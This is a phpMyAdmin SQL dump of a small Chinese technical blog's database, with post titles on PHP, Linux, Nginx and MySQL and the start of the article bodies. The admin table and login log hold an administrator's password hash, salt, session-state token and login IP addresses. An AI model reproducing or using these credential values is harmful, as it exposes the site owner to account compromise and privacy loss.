-- phpMyAdmin SQL Dump
-- version 3.3.8.1
-- http://www.phpmyadmin.net
--
-- 主机: w.rdc.sae.sina.com.cn:3307
-- 生成日期: 2013 年 12 月 25 日 23:28
-- 服务器版本: 5.5.23
-- PHP 版本: 5.3.3

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- 数据库: `app_imbzd`
--

-- --------------------------------------------------------

--
-- 表的结构 `la_admin`
--

CREATE TABLE IF NOT EXISTS `la_admin` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `adminname` varchar(50) NOT NULL,
  `password` varchar(50) NOT NULL,
  `ukey` char(6) NOT NULL COMMENT '混淆加密字符串6位',
  `status` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否启用',
  `ustate` varchar(32) NOT NULL DEFAULT '' COMMENT '登录状态码',
  `lastlogintime` int(10) DEFAULT '0',
  `lastloginip` int(11) DEFAULT '0',
  `logincount` tinyint(6) NOT NULL DEFAULT '0',
  `super` tinyint(1) DEFAULT '0' COMMENT '是否超级管理员0否1是',
  `createtime` int(10) NOT NULL DEFAULT '0',
  `updatetime` int(10) DEFAULT '0' COMMENT '更新时间',
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`adminname`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `la_admin`
--

INSERT INTO `la_admin` (`id`, `adminname`, `password`, `ukey`, `status`, `ustate`, `lastlogintime`, `lastloginip`, `logincount`, `super`, `createtime`, `updatetime`) VALUES
(1, 'admin', '6898eab4539ed58d4963824b1c0ce4a3', 'gmk4r2', 1, '206423eb45af33c046db62575e2522b2', 1387777972, 1884711009, 127, 1, 1323910052, 1386122911);

-- --------------------------------------------------------

--
-- 表的结构 `la_adminloginlog`
--

CREATE TABLE IF NOT EXISTS `la_adminloginlog` (
  `logid` int(10) NOT NULL AUTO_INCREMENT,
  `adminname` varchar(20) NOT NULL,
  `loginip` bigint(15) DEFAULT NULL,
  `logintime` int(10) DEFAULT NULL,
  PRIMARY KEY (`logid`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=33 ;

--
-- 转存表中的数据 `la_adminloginlog`
--

INSERT INTO `la_adminloginlog` (`logid`, `adminname`, `loginip`, `logintime`) VALUES
(1, 'admin', 0, 1381906598),
(2, 'admin', 0, 1382233905),
(3, 'admin', 0, 1382271602),
(4, 'admin', 0, 1385286259),
(5, 'admin', 0, 1385394361),
(6, 'admin', 0, 1386122887),
(7, 'admin', 0, 1386122927),
(8, 'admin', 0, 1386128986),
(9, 'admin', 0, 1386130989),
(10, 'admin', 2045525665, 1386172019),
(11, 'admin', 1884711841, 1386206313),
(12, 'admin', 1884711841, 1386208405),
(13, 'admin', 1884711841, 1386209787),
(14, 'admin', 1884711841, 1386212414),
(15, 'admin', 1884711059, 1386292541),
(16, 'admin', 1884711059, 1386292543),
(17, 'admin', 1884361609, 1386295109),
(18, 'admin', 1884361609, 1386302247),
(19, 'admin', 0, 1386425918),
(20, 'admin', 0, 1386486452),
(21, 'admin', 0, 1386767959),
(22, 'admin', 0, 1386770825),
(23, 'admin', 0, 1386854492),
(24, 'admin', 2044931510, 1386863741),
(25, 'admin', 2045730928, 1386936838),
(26, 'admin', 1884789066, 1387173741),
(27, 'admin', 1884789066, 1387185609),
(28, 'admin', 1884711806, 1387243948),
(29, 'admin', 1884711806, 1387249172),
(30, 'admin', 1884358591, 1387347707),
(31, 'admin', 986931427, 1387681432),
(32, 'admin', 1884711009, 1387777972);

-- --------------------------------------------------------

--
-- 表的结构 `la_admin_access`
--

CREATE TABLE IF NOT EXISTS `la_admin_access` (
  `adminid` int(10) NOT NULL DEFAULT '0',
  `nodeid` mediumint(6) NOT NULL DEFAULT '0',
  KEY `userid` (`adminid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `la_admin_access`
--


-- --------------------------------------------------------

--
-- 表的结构 `la_advertise`
--

CREATE TABLE IF NOT EXISTS `la_advertise` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `title` varchar(100) DEFAULT NULL,
  `link` varchar(300) DEFAULT NULL,
  `path` varchar(100) DEFAULT NULL COMMENT '图片路径',
  `flag` tinyint(1) DEFAULT '0' COMMENT '1:首页中部banner 2:栏目顶部广告',
  `status` tinyint(1) DEFAULT '1' COMMENT '0:禁用1:启用',
  `createtime` int(10) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;

--
-- 转存表中的数据 `la_advertise`
--

INSERT INTO `la_advertise` (`id`, `title`, `link`, `path`, `flag`, `status`, `createtime`) VALUES
(1, '1', '#', '/uploads/AdImage/1381906677_6kn443_3809_1368168836_w2hsg2_8994_ad_banner2.png', 1, 1, 1381906677),
(2, '1', '#', '/uploads/AdImage/1381906690_dgrwc8_9888_1368168836_w2hsg2_8994_ad_banner2.png', 2, 1, 1381906690);

-- --------------------------------------------------------

--
-- 表的结构 `la_archive`
--

CREATE TABLE IF NOT EXISTS `la_archive` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `title` varchar(100) CHARACTER SET utf8 NOT NULL COMMENT '文档标题',
  `author` varchar(50) CHARACTER SET utf8 NOT NULL COMMENT '文档作者',
  `columnid` int(10) NOT NULL DEFAULT '0' COMMENT '栏目ID',
  `thumbimage` varchar(100) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT '文章缩略图',
  `tag` varchar(100) COLLATE utf8_unicode_ci DEFAULT NULL,
  `source` varchar(200) COLLATE utf8_unicode_ci DEFAULT NULL,
  `seotitle` varchar(100) COLLATE utf8_unicode_ci DEFAULT NULL,
  `keyword` varchar(100) COLLATE utf8_unicode_ci DEFAULT NULL,
  `description` varchar(200) COLLATE utf8_unicode_ci DEFAULT NULL,
  `state` tinyint(1) NOT NULL DEFAULT '1' COMMENT '文章状态 0:回收站 1:正常发布 2:草稿箱',
  `status` tinyint(1) NOT NULL DEFAULT '1' COMMENT '评论状态 0:禁止评论 1:允许评论',
  `clicknum` int(6) DEFAULT '0' COMMENT '点击数',
  `commentnum` int(6) DEFAULT '0' COMMENT '评论数',
  `publishtime` int(10) DEFAULT '0' COMMENT '发布时间',
  `updatetime` int(10) DEFAULT '0' COMMENT '修改时间',
  PRIMARY KEY (`id`),
  KEY `catalog` (`author`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=98 ;

--
-- 转存表中的数据 `la_archive`
--

INSERT INTO `la_archive` (`id`, `title`, `author`, `columnid`, `thumbimage`, `tag`, `source`, `seotitle`, `keyword`, `description`, `state`, `status`, `clicknum`, `commentnum`, `publishtime`, `updatetime`) VALUES
(1, '仿google中国toolbar导航菜单', '步知道', 6, NULL, 'google,toolbar,导航,菜单', '', '', '', '', 1, 1, 5, 0, 1230516951, 1230516951),
(2, '关于PHP的static(静态)变量', '步知道', 4, NULL, 'PHP,static,变量', '', '', '', '', 1, 1, 3, 0, 1325555444, 1325555444),
(3, 'ApacheBench(ab)测试工具介绍 - 备忘与学习', '步知道', 13, NULL, 'Apache,Bench,测试', '', '', '', '', 1, 1, 10, 0, 1326419700, 1326419700),
(4, '用xdebug分析PHP以及结果分析程序webgrind的使用', '步知道', 4, NULL, 'xdebug,php,webgrind', '', '', '', '', 1, 1, 7, 0, 1326420007, 1386172390),
(5, '关于MEMCACHE的学习与备忘(一)', '步知道', 15, NULL, 'MEMCACHE', '', '', '', '', 1, 1, 7, 0, 1326420323, 1386172994),
(6, '关于MEMCACHE的学习与备忘(二)', '步知道', 15, NULL, 'MEMCACHE', '', '', '', '', 1, 1, 13, 0, 1326420350, 1386206555),
(7, 'MACOS系统中查看隐藏文件', '步知道', 2, NULL, 'MAC,OS,文件', '', 'MACOS系统中查看隐藏文件', 'MAC,OS,文件', '苹果MACOS系统查看隐藏文件有很多种方式，最简单的可以用terminal命令来查看', 1, 1, 6, 0, 1326420610, 1386206517),
(8, 'redis的介绍与使用(一) - 安装、扩展、benchmark等', '步知道', 6, NULL, 'redis,benchmark', '', '', '', '', 1, 1, 7, 0, 1326420918, 1386206807),
(9, 'redis的介绍与使用(二) - 管理端命令等', '步知道', 6, NULL, 'redis', '', '', '', '', 1, 1, 3, 0, 1326420950, 1386206981),
(10, 'vim、gvim在windows下中文乱码的解决方案', '步知道', 10, NULL, 'vim,gvim,乱码,解决方案', '', '', '', '', 1, 1, 5, 0, 1326421210, 1386207124),
(11, '新浪微博技术架构演讲 - 网上转载', '步知道', 14, NULL, '微博,架构,演讲', '', '', '', '', 1, 1, 14, 0, 1326421250, 1386207802),
(12, '在Mac OS X中配置Apache ＋ PHP ＋ MySQL + PHPMYADMIN', '步知道', 2, NULL, 'MACOS,Apache,PHP,MySql,PHPMyadmin', '', '', '', '', 1, 1, 3, 0, 1326421850, 1386212492),
(13, '为macos的php配置pdo_mysql扩展', '步知道', 2, NULL, 'MACOS,PHP,PDO', '', '', '', '', 1, 1, 6, 0, 1326422153, 1386292952),
(14, '【转载】每个程序员都该阅读的书', '步知道', 17, NULL, '书籍,程序员', '', '', '', '', 1, 1, 14, 0, 1326422157, 1326422157),
(15, 'HTML5新功能websocket的学习与备忘-PHP版（一）', '步知道', 4, NULL, 'HTML5,websocket', '', '', '', '', 1, 1, 3, 0, 1326433210, 1386302771),
(16, 'HTML5新功能websocket的学习与备忘-PHP版（二）', '步知道', 4, NULL, 'HTML5,PHP,websocket', '', '', '', '', 1, 1, 13, 0, 1326440107, 1386303020),
(17, '【转载】关于反向代理', '步知道', 14, NULL, '反向代理,Apache,Nginx,服务器,原理', '', '', '', '', 1, 1, 10, 0, 1327815606, 1386303520),
(18, 'PHP中错误报告值参数及说明的查询备忘', '步知道', 4, NULL, 'PHP,错误', '', '', '', '', 1, 1, 7, 0, 1327914621, 1386428911),
(19, 'PHP的pack方法总结备忘', '步知道', 4, NULL, 'PHP,pack,方法', '', '', '', '', 1, 1, 8, 0, 1328260532, 1386429124),
(20, '【转载】20个数据库设计值得遵循的规则', '步知道', 6, NULL, '数据库,ORM', '', '', '', '', 1, 1, 12, 0, 1328508987, 1386429425),
(21, 'nginx+PHP服务器环境安装与配置学习（一） - windows系统基础环境搭建', '步知道', 3, NULL, 'Nginx,PHP,服务器,Windows,环境', '', 'nginx+PHP服务器环境安装与配置学习', '', 'Nginx简介：Nginx (&quot;engine x&quot;) 是一个高性能的 HTTP 和 反向代理 服务器，也是一个 IMAP/POP3/SMTP 代理服务器。', 1, 1, 6, 0, 1328772625, 1386768322),
(22, 'vim代码颜色配置-PHP版', '步知道', 10, NULL, 'vim,PHP,代码,颜色', '', '', '', '', 1, 1, 6, 0, 1328890300, 1386768669),
(23, '【转载】MACVIM的配置文件.gvimrc备份', '步知道', 10, NULL, 'MACVIM,gvimrc', '', '', '', '', 1, 1, 5, 0, 1329043208, 1386770104),
(24, 'MAC OS下配置PHP的高效IDE - MACVIM', '步知道', 10, NULL, 'MACVIM,IDE,MAC', '', '', '', '', 1, 1, 3, 0, 1329062164, 1386770259),
(25, '【转载】求24点表达式的php实现', '步知道', 11, NULL, 'PHP,24点,算法', '', '', '', '', 1, 1, 5, 0, 1329270342, 1386770517),
(26, 'PHP安全基础学习与总结', '步知道', 4, NULL, 'PHP,安全', '', '', '', '', 1, 1, 4, 0, 1329750466, 1386771161),
(27, 'Nginx负载均衡session共享解决方案', '步知道', 14, NULL, 'Nginx,Session,负载均衡', '', '', '', '', 1, 1, 7, 0, 1330143002, 1386771493),
(28, 'MySQL全文检索中文搜索', '步知道', 6, NULL, 'MySQL,全文检索,中文', '', '', '', '', 1, 1, 5, 0, 1330354213, 1386771956),
(29, 'PHP中文分词算法及代码实现', '步知道', 11, NULL, 'PHP,中文,分词,算法', '', '', '', '', 1, 1, 2, 0, 1330358136, 1386772283),
(30, 'PHP+MySQL+SPHINX安装配置与测试', '步知道', 6, NULL, 'PHP,MySQL,sphinx', '', '', '', '', 1, 1, 4, 0, 1330699850, 1386772685),
(31, '【转载】sphinx检索语法与匹配模式备忘', '步知道', 6, NULL, 'PHP,MySQL,sphinx', '', '', '', '', 1, 1, 4, 0, 1330700830, 1386772800),
(32, 'Linux crontab 自动定时执行命令学习', '步知道', 1, NULL, 'Linux,crontab,命令', '', '', '', '', 1, 1, 4, 0, 1331104810, 1386773028),
(33, 'Ubuntu11安装配置nginx+mysql+php', '步知道', 1, NULL, 'Ubuntu,Nginx,MySQL,PHP', '', '', '', '', 1, 1, 5, 0, 1331389461, 1387347935),
(34, 'Linux常用命令学习之find命令', '步知道', 1, NULL, 'Linux,Find,命令', '', '', '', '', 1, 1, 3, 0, 1331624770, 1387347905),
(35, 'Linux常用命令学习之head/tail命令', '步知道', 1, NULL, 'Linux,Head,Tail,命令', '', '', '', '', 1, 1, 3, 0, 1331630859, 1387347892),
(36, 'Linux常用命令学习之grep命令', '步知道', 1, NULL, 'Linux,grep', '', '', '', '', 1, 1, 4, 0, 1331776348, 1387347868),
(37, 'Linux常用命令学习之sed命令', '步知道', 1, NULL, 'Linux,sed,命令', '', '', '', '', 1, 1, 4, 0, 1332221247, 1387347830),
(38, 'Linux常用命令学习之awk命令', '步知道', 1, NULL, 'Linux,awk,命令', '', '', '', '', 1, 1, 7, 0, 1336713312, 1386775909),
(39, 'PHP小知识 - 开启短标记支持', '步知道', 4, NULL, 'PHP,短标记', '', '', '', '', 1, 1, 2, 0, 1337000915, 1386776036),
(40, 'Linux知识 - 查看CPU信息、硬件型号等信息', '步知道', 1, NULL, 'Linux,CPU,硬件型号', '', '', '', '', 1, 1, 1, 0, 1337132832, 1386776112),
(41, 'MongoDB基本操作查询备忘', '步知道', 6, NULL, 'MongoDB', '', '', '', '', 1, 1, 4, 0, 1337302949, 1386776248),
(42, 'webbench - 网站压力测试工具', '步知道', 13, NULL, 'webbench,压力测试', '', '', '', '', 1, 1, 3, 0, 1337584806, 1386776475),
(43, 'PHP Redis中文文档', '步知道', 6, NULL, 'PHP,Redis', '', '', '', '', 1, 1, 2, 0, 1337826469, 1386776597),
(44, 'Thinkphp封装phpredis类', '步知道', 14, NULL, 'Thinkphp,PHP,Redis', '', '', '', '', 1, 1, 8, 0, 1337914040, 1386776766),
(45, '【转载】Mysql数据库性能优化', '步知道', 6, NULL, 'Mysql,数据库,优化', '', '', '', '', 1, 1, 4, 0, 1338456073, 1386776893),
(46, 'Sublime Text2 入门及技巧', '步知道', 10, NULL, 'Sublime Text 2', '', '', '', '', 1, 1, 5, 0, 1342862399, 1386777450),
(48, 'Sublime Text2 安装FTP插件', '步知道', 10, NULL, 'Sublime Text2', '', '', '', '', 1, 1, 4, 0, 1344305554, 1386777869),
(47, '【转载】使用RGBa和Filter实现不影响子元素的CSS透明背景', '步知道', 5, NULL, 'RGBA,Filter,CSS,透明背景', '', '', '', '', 1, 1, 6, 0, 1343497384, 1386777723),
(49, 'php-fpm的重启/关闭', '步知道', 1, NULL, 'PHP,FPM', '', '', '', '', 1, 1, 4, 0, 1345103388, 1386777954),
(50, 'Apache Rewrite 规则跳转常见配置', '步知道', 13, NULL, 'Apache,Rewrite', '', '', '', '', 1, 1, 2, 0, 1345448313, 1386778127),
(51, 'Nginx Rewrite 配置参数及例子', '步知道', 3, NULL, 'Nginx,Rewrite', '', '', '', '', 1, 1, 5, 0, 1345449230, 1386778290),
(52, 'Nginx配置rewrite时报directive &ldquo;rewrite&rdquo; is not terminated by &ldquo;;&rdquo;', '步知道', 3, NULL, 'Nginx,Rewrite', '', '', '', '', 1, 1, 7, 0, 1345449837, 1386778404),
(53, 'JQuery插件AjaxFileUpload实现ajax文件上传', '步知道', 6, NULL, 'JQuery,AjaxFileUpload,AJAX', '', '', '', '', 1, 1, 5, 0, 1347512213, 1386778572),
(54, 'PHP CURL扩展安装及使用', '步知道', 4, NULL, 'PHP,CURL', '', '', '', '', 1, 1, 2, 0, 1348214016, 1386778734),
(55, 'Code Swarm生成可视化项目代码贡献视频', '步知道', 13, NULL, 'Code Swarm', '', '', '', '', 1, 1, 4, 0, 1348898479, 1386778881),
(56, 'MAC svn命令行使用入门', '步知道', 2, NULL, 'MAC,SVN,命令', '', '', '', '', 1, 1, 4, 0, 1349186886, 1386854622),
(57, 'PHP使用zlib实现页面的gzip压缩输出', '步知道', 4, NULL, 'PHP,zlib,gzip', '', '', '', '', 1, 1, 6, 0, 1349834527, 1386854828),
(58, 'SafeSys.exe病毒清理笔记', '步知道', 13, NULL, '病毒,SafeSys', '', '', '', '', 1, 1, 5, 0, 1352519489, 1386854936),
(59, 'Apache的AllowOverride以及Options相关指令', '步知道', 13, NULL, 'Apache,AllowOverride', '', '', '', '', 1, 1, 2, 0, 1350008773, 1386855019),
(60, 'Thinkphp多数据库动态切换', '步知道', 6, NULL, 'Thinkphp,数据库', '', '', '', '', 1, 1, 3, 0, 1350877533, 1386855175),
(61, 'Sublime text2 快捷键', '步知道', 10, NULL, 'Sublime text2', '', '', '', '', 1, 1, 5, 0, 1353211939, 1386855275),
(62, 'PHP安装扩展Mysqli', '步知道', 4, NULL, 'PHP,Mysqli', '', '', '', '', 1, 1, 6, 0, 1353594051, 1387681466),
(63, 'IIS配置支持运行PHP', '步知道', 13, NULL, 'IIS,PHP', '', '', '', '', 1, 1, 3, 0, 1353772103, 1386855439),
(64, 'Windows下Mysql启动不了解决方案', '步知道', 6, NULL, 'Windows,Mysql', '', '', '', '', 1, 1, 3, 0, 1354512324, 1386855617),
(65, 'Windows配置PHP支持读写sqlserver2008', '步知道', 4, NULL, 'Windows,PHP,SQLServer', '', '', '', '', 1, 1, 4, 0, 1354885420, 1386855694),
(66, '人人围网站宕机原因及解决方法分析', '步知道', 14, NULL, '人人围,数据库', '', '', '', '', 1, 1, 4, 0, 1355032670, 1386855943),
(67, 'PHP获取未知MIME类型(如text/xml)的请求数据', '步知道', 4, NULL, 'PHP,MIME,XML', '', '', '', '', 1, 1, 2, 0, 1355209439, 1386856067),
(68, 'PHP将图片直接写入SQLServer2008', '步知道', 4, NULL, 'PHP,SQLServer', '', '', '', '', 1, 1, 3, 0, 1356699558, 1386856199),
(69, 'IIS Service Unavailable 解决方案（权限问题）', '步知道', 13, NULL, 'IIS', '', '', '', '', 1, 1, 5, 0, 1356930303, 1386856339),
(70, 'PHP源码加密', '步知道', 4, NULL, 'PHP,加密', '', '', '', '', 1, 1, 5, 0, 1357541759, 1386857013),
(71, 'PHP导出EXCEL类库-PHPExcel【备忘】', '步知道', 4, NULL, 'PHP,EXCEL', '', '', '', '', 1, 1, 4, 0, 1357833921, 1386857273),
(72, 'DNS污染【备忘】', '步知道', 13, NULL, 'DNS,污染', '', '', '', '', 1, 1, 3, 0, 1358926863, 1386857433),
(73, 'PHP启用COM服务及PHP Fatal error: Class &#039;com&#039; not found in ... 的处理办法', '步知道', 13, NULL, 'PHP,COM', '', '', '', '', 1, 1, 3, 0, 1366041225, 1386857557),
(74, 'PHP中使用COM组件出现&quot;拒绝访问&quot;的处理', '步知道', 13, NULL, 'PHP,COM,组件', '', '', '', '', 1, 1, 4, 0, 1366041475, 1386857633),
(75, 'Windows环境PHP调用DotNetZipLib处理zip64文件', '步知道', 4, NULL, 'Windows,PHP,DotNetZipLib,zip', '', '', '', '', 1, 1, 3, 0, 1366084284, 1386857759),
(76, '【转载】MySQL查询in操作 查询结果按in集合顺序显示', '步知道', 6, NULL, 'MySQL', '', '', '', '', 1, 1, 5, 0, 1366793616, 1386857860),
(77, 'C#编写dll库文件并注册为COM组件供其他语言(如PHP等)调用', '步知道', 13, NULL, 'C#,dll,COM,PHP', '', '', '', '', 1, 1, 4, 0, 1368291595, 1386858430),
(78, 'PHP调用SQLServer存储过程使用事务处理', '步知道', 6, NULL, 'PHP,SQLServer,存储过程,事务', '', '', '', '', 1, 1, 6, 0, 1368419719, 1386858596),
(79, 'PHP企业级应用之常见缓存技术深入解读', '步知道', 15, NULL, 'PHP,缓存技术', '', '', '', '', 1, 1, 4, 0, 1368754626, 1386858882),
(80, 'PHP设计模式之单例模式', '步知道', 4, NULL, 'PHP,设计模式,单例', '', '', '', '', 1, 1, 4, 0, 1369720439, 1386858965),
(81, 'openfire开发环境安装和配置', '步知道', 13, NULL, 'openfire', '', '', '', '', 1, 1, 6, 0, 1371032590, 1386859386),
(82, 'Web.config配置文件详解', '步知道', 13, NULL, 'WebConfig', '', '', '', '', 1, 1, 3, 0, 1371438590, 1386859496),
(83, 'WIN7系统 PHP连接MYSQL效率太慢解决方案', '步知道', 6, NULL, 'WIN7,PHP,MySQL', '', '', '', '', 1, 1, 5, 0, 1372838371, 1386859659),
(84, 'IIS7下,flush无效,解决方案', '步知道', 4, NULL, 'IIS,Flush', '', '', '', '', 1, 1, 6, 0, 1375274678, 1386859795),
(85, 'MySQL从一个表获取数据插入另外一个表【备忘】', '步知道', 6, NULL, 'MySQL', '', '', '', '', 1, 1, 10, 0, 1375671855, 1386859919),
(86, '【转载】PHPExcel使用方法总结', '步知道', 4, NULL, 'PHPExcel', '', '', '', '', 1, 1, 4, 0, 1379036555, 1386860153),
(87, 'Virtualbox虚拟机 配置centos上网', '步知道', 13, NULL, 'Virtualbox,Centos', '', '', '', '', 1, 1, 3, 0, 1367480481, 1386863899),
(88, 'Linux centos关机与重启命令', '步知道', 1, NULL, 'Linux,centos', '', '', '', '', 1, 1, 6, 0, 1380445362, 1386936927),
(89, 'Centos6.4错误的修改了rc.local无法启动系统解决方案', '步知道', 1, NULL, 'Centos', '', '', '', '', 1, 1, 1, 0, 1367401664, 1386863782),
(90, 'CentOS搭建vsftpd服务器详解', '步知道', 1, NULL, 'CentOS,vsftpd,服务器', '', '', '', '', 1, 1, 13, 0, 1380639119, 1386861068),
(91, 'Centos vsftpd 553 Could not create file解决方法', '步知道', 1, NULL, 'Centos,vsftpd', '', '', '', '', 1, 1, 8, 0, 1380639252, 1386861156),
(92, 'MySQL开启远程连接', '步知道', 6, NULL, 'MySQL', '', '', '', '', 1, 1, 9, 0, 1381991066, 1386861293),
(93, 'Mysql中空间扩展 - 查询你附近的餐厅或酒店', '步知道', 6, NULL, 'Mysql,Geometry,空间坐标', '', '', '', '', 1, 1, 10, 1, 1382437816, 1386861406),
(94, 'Apache配置多网站绑定不同域名访问', '步知道', 13, NULL, 'Apache,域名', '', '', '', '', 1, 1, 15, 0, 1385822364, 1386861506),
(95, '【转载】PHP的闭包', '步知道', 4, NULL, 'PHP,闭包', '', 'PHP的闭包', 'PHP 的 闭包', 'PHP的闭包', 1, 1, 20, 0, 1387174629, 1387176427),
(96, 'jQuery的.bind()、.live()和.delegate()之间区别', '步知道', 6, NULL, 'jQuery,bind,live,delegate', '', 'jQuery的.bind()、.live()和.delegate()之间区别', 'jQuery,bind,live,delegate,区别', 'jQuery的.bind()、.live()和.delegate()之间的区别并非总是那么明显的，然而，如果我们对所有的不同之处都有清晰的理解的话，那么这将会有助于我们编写出更加简洁的代码，以及防止在交互应用中弹出错误', 1, 1, 27, 2, 1387185617, 1387186292),
(97, '【转载】Nginx战斗准备 - 优化指南', '步知道', 3, NULL, 'Nginx,优化,服务器', '', 'Nginx战斗准备 - 优化指南', 'Nginx,战斗,准备,优化,指南', 'Nginx战斗准备 - 优化指南', 1, 1, 62, 0, 1387249179, 1387249851);

-- --------------------------------------------------------

--
-- 表的结构 `la_article`
--

CREATE TABLE IF NOT EXISTS `la_article` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `archiveid` int(10) NOT NULL DEFAULT '0' COMMENT '文档ID',
  `content` longtext COMMENT '文档内容',
  `updatetime` int(10) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=98 ;

--
-- 转存表中的数据 `la_article`
--

INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
(1, 1, '&lt;p&gt;&lt;span style=&quot;color:#262626;&quot;&gt;一直感觉google中国的导航菜单风格不错~闲来无事仿造了一个&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#262626;&quot;&gt;当然：google的那个不敢比~凑合着用吧~&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#262626;&quot;&gt;代码如下：&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:js;toolbar:false;&quot;&gt;&amp;lt;div&amp;gt;The google toolbar&amp;lt;/div&amp;gt;\r\n&amp;lt;div id=&quot;floatdiv&quot; style=&quot;width:50px; height:37px; margin-top:3px; overflow:hidden;&quot;&amp;gt;\r\n &amp;lt;a href=&quot;#&quot;&amp;gt;&amp;lt;img id=&quot;img1&quot; src=&quot;toolbar.png&quot; border=0 style=&quot;margin-top:-222px;&quot; onMouseOver=&quot;floatShow()&quot; onMouseOut=&quot;floatHidden()&quot;&amp;gt;&amp;lt;/a&amp;gt;\r\n&amp;lt;/div&amp;gt;\r\n&amp;lt;script language=&quot;javascript&quot;&amp;gt;\r\nvar ml= 0, ml2= 210, T1, T2, T3, T4;\r\nfunction floatShow()\r\n{\r\n    clearTimeout(T1);\r\n    clearTimeout(T4);\r\n    if (ml &amp;lt; 208) {\r\n        ml = ml + 52;\r\n        document.getElementById(&quot;img1&quot;).style.marginLeft = -ml + &quot;px&quot;;\r\n        if (ml &amp;lt;= 156) {\r\n            T1 = setTimeout(&quot;floatShow()&quot;,100);\r\n        } else {\r\n            T1 = setTimeout(&quot;floatShow()&quot;,50);\r\n            T2 = setTimeout(&quot;bulletTop()&quot;,10);\r\n            T3 = setTimeout(&quot;bulletBlow()&quot;,150);\r\n        }\r\n    } else {\r\n        clearTimeout(T1);\r\n        ml = 0;\r\n    }\r\n}\r\nfunction floatHidden()\r\n{\r\n    clearTimeout(T1);\r\n    clearTimeout(T4);\r\n    if (ml2 &amp;gt; 0) {\r\n        if (ml2 == 210) {\r\n            T2 = setTimeout(&quot;bulletTop()&quot;,10);\r\n            T3 = setTimeout(&quot;bulletBlow2()&quot;,150);\r\n            T4 = setTimeout(&quot;floatHidden()&quot;,150);\r\n        } else {\r\n            ml2 = ml2 - 52;\r\n            document.getElementById(&quot;img1&quot;).style.marginLeft = -ml2 + &quot;px&quot;;\r\n            if (ml2 &amp;gt; 156) {\r\n                T4 = setTimeout(&quot;floatHidden()&quot;,10);\r\n            } else {\r\n                T4 = setTimeout(&quot;floatHidden()&quot;,50);\r\n            }\r\n        }\r\n    } else {\r\n        clearTimeout(T4);\r\n        ml2 = 210;\r\n    }\r\n}\r\nfunction bulletTop()\r\n{\r\n    document.getElementById(&quot;floatdiv&quot;).style.marginTop = &quot;0px&quot;;\r\n}\r\nfunction bulletBlow()\r\n{\r\n    document.getElementById(&quot;floatdiv&quot;).style.marginTop = &quot;3px&quot;;\r\n}\r\nfunction bulletBlow2()\r\n{\r\n    document.getElementById(&quot;floatdiv&quot;).style.marginTop = &quot;3px&quot;;\r\n    ml2 = ml2 - 2;\r\n}\r\n&amp;lt;/script&amp;gt;&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386130175),
(2, 2, '&lt;p&gt;首先明确一下static在语法上的定义：&lt;br /&gt;PHP中的类中，静态变量前要加static关键字修饰，而实例变量前则不加。&lt;br /&gt;&lt;br /&gt;静态变量是什么：&lt;br /&gt;静态变量可以直接用类名加::调用，而不需要去实例化类，静态变量的生命周期取决于类的生命周期，静态变量一旦被调用，就会始终存在内存中，直到程序结束之后，静态变量才会被注销。静态变量亦有作用域，在作用域之外不能使用。&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;我们看一段代码&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;class test \r\n{ \r\n    public $var1 = &#039;instance var&#039;; \r\n    static public $var2 = &#039;static var&#039;; \r\n          \r\n    public function getVar1() \r\n    { \r\n        return $this-&amp;gt;var1; \r\n    } \r\n          \r\n    static public function getVar2() \r\n    { \r\n        self::$var2 = &#039;new static var&#039;; \r\n    } \r\n} \r\n$t = new test(); \r\necho $t-&amp;gt;getVar1(); \r\necho &quot;&amp;lt;br /&amp;gt;&quot;; \r\necho test::$var2; \r\necho &quot;&amp;lt;br /&amp;gt;&quot;; \r\ntest::getVar2(); \r\necho test::$var2;&lt;/pre&gt;&lt;p&gt;上面的例子输出结果为：&lt;/p&gt;&lt;div id=&quot;sina_keyword_ad_area2&quot; class=&quot;articalContent  &quot;&gt;instance var&lt;br /&gt;static var&lt;br /&gt;new static var&lt;br /&gt;&lt;br /&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;在上面的例子中，我们定义了一个test类，然后定义了两个变量，实例变量$var1和静态变量$var2，两个类方法，实例方法getVar1()和静态方法getVar2()。&lt;br /&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;我们可以看到，实例变量需要首先将该类实例化，才能用类实例去访问该变量，包括赋值以及做逻辑运算，而静态变量则不需要类实例，可以直接用类名加::访问。&lt;br /&gt;&lt;br /&gt;什么时候用静态变量：&lt;br 